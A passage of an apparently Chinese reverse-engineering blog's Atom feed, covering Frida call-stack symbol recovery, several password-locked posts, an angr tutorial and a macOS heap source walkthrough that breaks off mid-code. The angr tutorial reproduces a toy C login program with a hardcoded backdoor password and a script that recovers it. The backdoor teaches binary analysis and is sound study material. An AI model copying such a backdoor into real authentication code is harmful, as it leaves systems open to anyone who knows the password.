src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>andoid调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid调试深度总结/andoid调试深度总结/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-06-05T06:57:29.464Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1/GHMc4rWCv3tLPB5BAnvpclW+MgxuOeTNwNR4TRzwS/jR8PiogQqV8nNFfw/hc0pj8rOuVq/ASj2xT3qti0AxWB2vqfPbFUUITRIAZ0dWC+kqpo/vIF4kpLUSdtxJBpn02wnSOryatHYFZGxReo3uxUjAYxT3Lxk+mXzqrIEJV8LIJZZjfCZ3YmAPxqzqjaVs2Dg8R9GyBYbfD0RsLDaSSS/G00saAiK172fiI956pJ0qhw62mLp4Y9FVGv9Q4U6SXPgWQ5RtVZyBTwKtgMHhW/FsZ8ri6y92ZxNX7ccfFi6ZYbb5pkc70FXHR5QABe/1UqU1OA55Sgc5z4c0AJlnt84CAlogMh9GUoREiu7D/1uDihlzLFe3Dn3Y9+w2KliMcCBKl7k07G1eSZl0AbBzjPP2c1Uc0a9AzdKVlgirl0vlmL68PIX5p70J4Pk/zNhngjeq3nDsxhCaBrvYAm4KdhQsxYV3qMWwqRlrrpgjZUSFo/ZBKpJViXZqozeQBahnZYbSu1Z0K5ZiD0Kc5k6TurhpxSpFKH1d19wDTYMRHEyQWDqXduDJkaC2ESJmJ6OoRB4CHfdruHZE3KtZgJNy9mdqGKYTEVk5U8Mug9B0CyKJNUBD0pld07LKZAMKJFlnTjGgxoSUG8PGNsSfDiBYC68XGqJcDPC/ic3lnQ09g1u5kFkfffviQTV16jPnDXIenBpvX/dG8D7Knl4NR8Hn+vqzvdmNZlzBbVqMmEiB4rC/i7rZb3dnEVQ2B5sshMi/nZH/vYeDxqOr5yrEH8F6zeT27ckCduGo3vgqrCQPwzJJljZ7Go03wn9GoenuuPGlq2WMDAlgiNRzXihW2ExWUF70bFrUVNuUwuGHZAjOYRp0fkyrr5oRFsvwnddKM8GjEbraVuyHF6dE1m2DutEowF+7CGSziJ/8ulGCrSpt2bLxcePqoAvx13vHcY/bxBn5CcLThbYrqButFjcDJhTpDHPHc2pRNSE+8Y96rs7Knmg21YjH53qg+XXY481v5MkM2B42nWegMoPyiYUleND3gLbpc7v/SSACPYNb+F9nQAnCtT+PCSqmq7CLbZYi20t0UCkiFwP+ntuzlBAtsCAqxEZXLPllfR9Z/0JbcUtlpVrGKGfLRwDo5NhC+AyTE+3qqEPetx+bMn0vblHI0IHLceDQ67uUcjYw0gT6dtXyZtkU+5/wGnxrLgsqJd2N8xAyrtKUA7o2NpzH1YP9RJqzEJoPpqWa+MhwbDNBOo7H1F7szMxZKcOW2g5IXEWtEZ0tQoS1kbhVtaDAbYNaAxQeXGEzSjsemQ0QA+jFQmGz37ld05MnqErrv9dJ4Z9xekcLgOnz/XJXaqR/eTBLL+vT/W6yqdomFT0WTKIbPb9KnxoIlpDslR5BozwEeiHUs9pv8JIYGD0bEw04Jhn/XJdri196FdHiShr5n0n7D81GZKDV/6VKUdGXR7vIt6CYuCPd1ky6COsSg8/xki4qLHA/OiHgj7gd4/HBJk4kcBozW+a+Vx+F4QqH9k/WWGgc46bFD4ilTTl49F3nYt7rsksjFDzuzLquJEyx5pA6fvDh28RyE00lwUBsZpbt8kfxjZnZIL3rc5uuPc755Oy58ecpeOazDOeugR8FtM+xbkS/YyqWphbnfYLvriXXB4Xd26H6BrUj1+luvDajQl3uWUGQErNlfG1cykzPrBlVbHf44V8lOuyC6Be86eAfzAoJhJHkQ7D5IldobzHMv3gHBsnJQN3rFxidMCrO7sxxNf2QwHWf5bIsbGAcHA3WiudizvnLEBrky7A4QXhkWZE029+wZwdvg1fHV8wwgfiQXjlmPtR6Gtpsd44mRkauXV4Y8E8tyzz03dX+gT2wAhtGhwaX7yCQyFXfIuAk8djEKH2Q54ErbRE4KXTVbfPBhKRrw0PGYjEglm14l5lg+wfUmwfB92oyMjz1J4bSBaTUuuISyVfGQuvxT/XvfY5APTYxzxv5pZNx9X87n77fPmUWS1x11XDYL5epFRexmoFmy8Nt1O0plcnQc12ZYVy0nSbbCKJ5VY1vhl1/kl+dHALuDcmYxzmk4z3R23jH3Zklf93zdn6TNVcuCIpU8JedHzDuVLnYfWhYtThJ9UWPmY0VpRDZhmi1VildXJVQ6ZbB0wFgGm5x7a00inBgh7b3B2Zh6ncMeiQVUWXlJoloQJ/9ltXcx/1t3FEvYfP/ti+3O6zLTAI0oEjyL0q9KMIuolf9/k5WtfC1oYHK6Ri37VqSBNqjlWTacRot5OjKavRSBP+KFDiQU6t51b8imAxGymKS69edIG875PYGxOkL4fBsoMQNaXvBO3yTue38IwGd35ZMr+KlsD/F7KMFxtRjEv3UW5+oQN2tdMKYgP0mJQ9iLQViDkbC4M8mhaot/Jz5Ivlm+ruo1oc0DMolIlnZq6Cc/xsLazATlxa3e2lX9Q1Idn+S6er/aqw00nACikuCY1RWxB16dbvtG/AE3</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android Auto.js脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-04-30T02:52:18.678Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="auto.js" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/auto-js/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number 